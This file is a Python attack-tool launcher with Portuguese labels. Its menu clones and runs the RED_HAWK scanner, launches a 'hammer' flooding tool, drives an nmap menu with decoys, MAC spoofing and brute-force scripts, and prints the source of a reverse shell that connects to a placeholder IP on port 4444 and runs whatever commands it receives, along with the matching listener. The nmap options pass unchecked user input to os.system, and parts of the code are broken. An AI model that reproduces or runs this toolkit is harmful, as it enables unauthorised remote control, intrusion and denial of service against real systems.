 import os
import time
R = "\033[0m"      # reset
B = "\033[34m"     # azul escuro
C = "\033[94m"     # azul claro
P = "\033[95m"     # rosa
G = "\033[32m"     # verde
Y = "\033[33m"     # amarelo
W = "\033[97m"     # branco
O = "\033[38;5;208m"  # laranja
def interface():
    os.system('clear')
    print (f"{B}------------------------------{P}------------------{C}---------------------------------------")
    print (f"{B}|                              {P}                 {C}                                      |")
    print (f"{B}|                                 {P}              {C}                                      |")
    print (f"{B}|                                                     {C}                                   |")
    print (f"{B}|                       S   C{P} A   N  N  I  N  G        {C}                               |")
    print (f"{B}|                                                         {C}                               |")
    print (f"{B}|                            {P}     O   F                   {C}                            |")
    print (f"{B}|                              {P}                              {C}                         |")
    print (f"{B}|                                 {P}     T  H  E                  {C}                      |")
    print (f"{B}|                                       {P}                                                 |")
    print (f"------------------------------------------------------------------------------------------------")
    print ("")
    print ("")
    print ("")
    print (f"{Y} [01]---(NMAP)")
    print (f"{Y} [02]---(RED_HAWLK)")
    print (f"{Y} [03]---(HAMMER)")
    print (f"{Y} [04]---(exploit=(conection+playload)")
interface()
def function1():
    opt = input(">>>")
    if opt == "2" or opt == "02":
        os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK.git; cd RED_HAWK; php rhawk.php')
    elif opt == "4" or opt == "04":
        print (''' codigo playload :  import os
         			      import socket
				      def CONECTION():
    					 print (SUA MENSAGEM)
    					 s = socket.socket()
    					 s.connect(([SEU_IP, 4444))
    					 while True:
        				     terminal = s.recv(1024).decode()
        				     dados = os.popen(terminal).read()
        				     s.send(dados.encode())
				   	     CONECTION() ''')
        print ("")
        print ("")
        print ("")
        print ("=====================================================================================")
        print ("")
        print ("")
        print (''' codigo conexão:  import socket
def receptor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print ("aguardando conexão...")
    cn2, addr = s.accept()
    print (f"alvo conectado alvo = {addr}")
    while True:
        msg = input("rootkali@#>>>  ")
        cn2.send(msg.encode())
        rpt = cn2.recv(10240).decode()
        print (f"{rpt}")
receptor()''')
        print ("")
        print ("")
        print ("")
        print (" o codigo abaixo é um erro")
        print ("")
        print ("")
        print ("")
        print ("")
    elif opt == "3" or opt == "03":
        os.system('cd hammer && python hammer.py')
    elif opt == "1" or opt == "01":
        print(f"""{O}
======================= NMAP SUPREME INTERACTIVE ARSENAL =======================
{W}
 [01] Scan Simples (TCP)          [18] Window Scan (-sW)           [35] FTP Bounce Scan (-b)
 [02] Scan Completo (-A)          [19] Maimon Scan (-sM)           [36] HTTP Enum (Scripts)
 [03] Scan UDP (-sU)              [20] Null Scan (-sN)             [37] Brute Force (Geral)
 [04] Detectar Versão (-sV)       [21] FIN Scan (-sF)              [38] Malware/Backdoor Check
 [05] Detectar SO (-O)            [22] Xmas Scan (-sX)             [39] Listar Interfaces/Rotas
 [06] Scan Rápido (-F)            [23] Protocolos IP (-sO)         [40] Salvar Tudo (-oA)
 [07] Todas Portas (-p-)          [24] Scan RPC (-sR)              [41] Scan de Corrupção (Badsum)
 [08] Stealth SYN (-sS)           [25] Listagem (No Scan) (-sL)    [42] SMB OS Discovery
 [09] Fragmentar (-f)             [26] Scan SCTP (-sY)             [43] Heartbleed Check
 [10] Scripts Padrão (-sC)        [27] No-Ping Scan (-Pn)          [44] SSL/TLS Ciphers Scan
 [11] Ping Scan (-sn)             [28] ARP Ping (-PR)              [45] DNS Brute Force
 [12] Traceroute                  [29] ICMP Echo Ping (-PE)        [46] DHCP Discover
 [13] IPv6 Scan (-6)              [30] Subrede (CIDR)              [47] Portas Específicas
 [14] Scripts VULN (NSE)          [31] Packet Tracing              [48] Iscas (Decoys) (-D)
 [15] Velocidade (T0-T5)          [32] Controle de Taxa (Rate)     [49] Evasão com MTU
 [16] Idle Scan (Zumbi)           [33] DNS Reverso (-R)            [50] Broadcast Discovery

 [99] Instalar Nmap               [00] Sair
{R}""")
        opc = input(f"{C}Escolha o módulo >>> {W}")
    if opc == "00" or opc == "0":
        exit()
    elif opc == "99" or opc == "999":
        os.system("pkg update -y && pkg install nmap -y")
        
        # Comandos que não exigem alvo IP inicial
    elif opc == "39": os.system("nmap --iflist");
    elif opc == "46": os.system("nmap --script broadcast-dhcp-discover");
    elif opc == "50": os.system("nmap --script broadcast");

    alvo = input(f"{Y}Digite o alvo (IP/Host/Range): {R}")

    if opc == "01":
        os.system(f"nmap {alvo}")
        
    elif opc == "02":
        os.system(f"nmap -A {alvo}")
        
    elif opc == "03":
        os.system(f"nmap -sU {alvo}")
        
    elif opc == "04":
        ver = input(f"{P}Intensidade da versão (0-9, padrão 7): {R}")
        os.system(f"nmap -sV --version-intensity {ver} {alvo}")
        
    elif opc == "05":
        os.system(f"nmap -O {alvo}")
        
    elif opc == "06":
        os.system(f"nmap -F {alvo}")
        
    elif opc == "07":
        os.system(f"nmap -p- {alvo}")
        
    elif opc == "08":
        os.system(f"nmap -sS {alvo}")
        
    elif opc == "09":
        os.system(f"nmap -f {alvo}")
        
    elif opc == "10":
        os.system(f"nmap -sC {alvo}")
        
    elif opc == "11":
        os.system(f"nmap -sn {alvo}")
        
    elif opc == "12":
        os.system(f"nmap --traceroute {alvo}")
        
    elif opc == "13":
        os.system(f"nmap -6 {alvo}")
        
    elif opc == "14":
        script_cat = input(f"{P}Nome do script ou categoria (ex: vuln, auth, default): {R}")
        os.system(f"nmap --script {script_cat} {alvo}")
        
    elif opc == "15":
        v = input(f"{P}Velocidade (0=Lento, 3=Normal, 5=Agressivo): {R}")
        os.system(f"nmap -T{v} {alvo}")
        
    elif opc == "16":
        zumbi = input(f"{P}IP do Host Zumbi (Idle Host): {R}")
        porta_z = input(f"{P}Porta do Zumbi (vazio para padrão): {R}")
        cmd_z = f":{porta_z}" if porta_z else ""
        os.system(f"nmap -Pn -sI {zumbi}{cmd_z} {alvo}")
        
    elif opc == "17":
        os.system(f"nmap -sA {alvo}")
        
    elif opc == "18":
        os.system(f"nmap -sW {alvo}")
        
    elif opc == "19":
        os.system(f"nmap -sM {alvo}")
        
    elif opc == "20":
        os.system(f"nmap -sN {alvo}")
        
    elif opc == "21":
        os.system(f"nmap -sF {alvo}")
        
    elif opc == "22":
        os.system(f"nmap -sX {alvo}")
        
    elif opc == "23":
        os.system(f"nmap -sO {alvo}")
        
    elif opc == "24":
        os.system(f"nmap -sR {alvo}")
        
    elif opc == "25":
        os.system(f"nmap -sL {alvo}")
        
    elif opc == "26":
        os.system(f"nmap -sY {alvo}")
        
    elif opc == "27":
        os.system(f"nmap -Pn {alvo}")
        
    elif opc == "28":
        os.system(f"nmap -PR {alvo}")
        
    elif opc == "29":
        os.system(f"nmap -PE {alvo}")
        
    elif opc == "30":
        mask = input(f"{P}Máscara CIDR (ex: 24 para /24): {R}")
        os.system(f"nmap {alvo}/{mask}")
        
    elif opc == "31":
        os.system(f"nmap --packet-trace {alvo}")
        
    elif opc == "32":
        rate = input(f"{P}Enviar no mínimo quantos pacotes por seg? {R}")
        os.system(f"nmap --min-rate {rate} {alvo}")
        
    elif opc == "33":
        os.system(f"nmap -R {alvo}")
        
    elif opc == "34":
        mac_addr = input(f"{P}Digite o MAC (0 para aleatório): {R}")
        os.system(f"nmap --spoof-mac {mac_addr} {alvo}")
        
    elif opc == "35":
        proxy = input(f"{P}IP do Host FTP Relay: {R}")
        os.system(f"nmap -b {proxy} {alvo}")
        
    elif opc == "36":
        os.system(f"nmap --script http-enum {alvo}")
        
    elif opc == "37":
        service = input(f"{P}Serviço para Brute Force (ex: ssh, ftp, mysql): {R}")
        os.system(f"nmap --script {service}-brute {alvo}")
        
    elif opc == "38":
        os.system(f"nmap --script malware {alvo}")
        
    elif opc == "40":
        output = input(f"{P}Nome base para os arquivos de log: {R}")
        os.system(f"nmap -oA {output} {alvo}")
        
    elif opc == "41":
        os.system(f"nmap --badsum {alvo}")
        
    elif opc == "42":
        os.system(f"nmap --script smb-os-discovery {alvo}")
        
    elif opc == "43":
        p_ssl = input(f"{P}Porta SSL (padrão 443): {R}")
        os.system(f"nmap -p {p_ssl} --script ssl-heartbleed {alvo}")
        
    elif opc == "44":
        os.system(f"nmap --script ssl-enum-ciphers {alvo}")
        
    elif opc == "45":
        domain = input(f"{P}Domínio para Brute Force de DNS: {R}")
        os.system(f"nmap --script dns-brute --script-args dns-brute.domain={domain}")
        
    elif opc == "47":
        ports = input(f"{P}Quais portas (ex: 80,443,22 ou 1-1000): {R}")
        os.system(f"nmap -p {ports} {alvo}")
        
    elif opc == "48":
        num_decoys = input(f"{P}Quantas iscas (IPs falsos) gerar? {R}")
        os.system(f"nmap -D RND:{num_decoys} {alvo}")
        
    elif opc == "49":
        mtu_val = input(f"{P}Valor do MTU (deve ser múltiplo de 8): {R}")
        os.system(f"nmap -f --mtu {mtu_val} {alvo}")
        
    else:
        print(f"{R}Opção Inválida!{R}")
function1()
